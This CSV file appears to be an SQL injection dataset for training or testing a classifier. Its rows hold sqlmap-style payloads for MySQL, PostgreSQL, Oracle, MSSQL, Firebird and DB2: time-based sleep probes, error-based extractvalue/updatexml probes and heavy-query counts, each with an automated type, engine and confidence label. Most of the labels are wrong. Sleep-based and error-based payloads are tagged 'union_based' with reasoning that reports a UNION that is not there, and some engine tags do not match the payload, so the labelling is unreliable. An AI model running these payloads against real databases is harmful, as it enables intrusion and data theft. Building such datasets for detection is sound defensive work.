id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21526,"1"" and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
21532,"1"" ) where 4038 = 4038 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
21533,"1"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""bcxh"" like ""bcxh",union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
21534,"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'fvtf' like 'fvtf",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
21536,"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
21539,"1"" ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""gcnq"" like ""gcnq",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
21544,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
21546,1 ) where 6884 = 6884 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
21547,"1' or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
21548,"1"" ) ) as zgig where 5748 = 5748 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
21550,select ( case when ( 8916 = 1357 ) then 8916 else 8916* ( select 8916 from information_schema.character_sets ) end ) #,union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
21554,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'cfzp' like 'cfzp",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21555,1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'vtoi' like 'vtoi,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
21559,"1"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""hbgr"" like ""hbgr",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21563,"1 ) where 5378 = 5378 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
21567,"1"" where 5406 = 5406 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21569,1%' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( '%' = ',union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
21573,"-1956"" ) where 1448 = 1448 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
21575,1 ) where 9649 = 9649 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
21589,"1"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""uzjn"" = ""uzjn",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
21596,-8099%' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( '%' = ',union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
21597,"-3733' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'ybgd' = 'ybgd",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
21598,"1"" ) where 5197 = 5197 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
21599,1' in boolean mode ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) #,union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
21402,"1', ( select ( case when ( 2073 = 5314 ) then 1 else 1/ ( select 0 ) end ) )",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 76 chars.,0
21404,"1"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""sjiz"" like ""sjiz",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
21408,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ytxg' = 'ytxg,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
21409,"1%"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
21413,if ( 2697 = 2008 ) select 2697 else drop function jcoo--,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,0
21414,"1 where 6119 = 6119 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
21418,"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""knbx"" = ""knbx",union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
21419,"1' ) ) as fjbe where 4662 = 4662 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
21431,"1 ) where 2741 = 2741 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
21432,"1, ( select * from generate_series ( 9108,9108,case when ( 9108 = 2900 ) then 1 else 0 end ) limit 1 )",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 102 chars.,0
21448,1'|| ( select 'tezo' from dual where 4436 = 4436,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
21490,1'|| ( select 'xugb' from dual where 6772 = 6772,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
21495,1'+ ( select 'vtyw' where 7950 = 7950 order by 1--,union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,0
21517,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'lqwz' = 'lqwz",union_based,mysql,0.9,Signals: 'benchmark'; UNION-based payload detected; DB: mysql,0
21522,"1%' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( '%' = '",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
21529,"select sleep ( 5 ) and ( ( ""%"" = """,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
21540,"1'+ ( select 'rpbx' where 6748 = 6748 and elt ( 4249 = 4249,7259 ) ) +'",union_based,mysql,0.9,Signals: 'elt'; UNION-based payload detected; DB: mysql,0
21570,"1%' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( '%' = '",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
21584,select case when 2095 = 9074 then 1 else null end--,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 51 chars.,0
21590,"1'|| ( select 'osux' from dual where 7066 = 7066 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
21412,1'+ ( select hvsb where 3666 = 3666,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
21438,"1"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 166 chars.,0
21455,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""seci"" = ""seci",union_based,generic,0.7,UNION-based payload detected. Payload length: 106 chars.,0
21462,"1' ) as jwvp where 5231 = 5231 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 141 chars.,0
21463,"1"" ) as ubva where 6369 = 6369 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 134 chars.,0
21469,"1%' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( '%' = '",union_based,generic,0.7,UNION-based payload detected. Payload length: 177 chars.,0
21473,"1'+ ( select 'ndpx' where 4061 = 4061 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 147 chars.,0
21476,"1"" where 5552 = 5552 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 180 chars.,0
21484,"1%"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,union_based,generic,0.7,UNION-based payload detected. Payload length: 122 chars.,0
21500,1'+ ( select 'jmdl' where 7827 = 7827,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
21506,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",union_based,generic,0.7,UNION-based payload detected. Payload length: 95 chars.,0
21528,"1' ) ) as yyja where 4321 = 4321 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 142 chars.,0
21530,"1%"" ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 118 chars.,0
21549,1'|| ( select 'zwcp' where 3333 = 3333,union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,0
21552,"1%' ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 119 chars.,0
21560,"1"" ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""ajuh"" = ""ajuh",union_based,generic,0.7,UNION-based payload detected. Payload length: 183 chars.,0
21564,1'+ ( select 'zgtu' where 8419 = 8419,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
21579,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",union_based,generic,0.7,UNION-based payload detected. Payload length: 159 chars.,0
21582,"1 ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 5132 = 5132",union_based,generic,0.7,UNION-based payload detected. Payload length: 178 chars.,0
21585,1'|| ( select 'qstz' where 6835 = 6835,union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,0
21591,"1%' ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 167 chars.,0
21595,"1'|| ( select 'scba' where 9079 = 9079 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 110 chars.,0
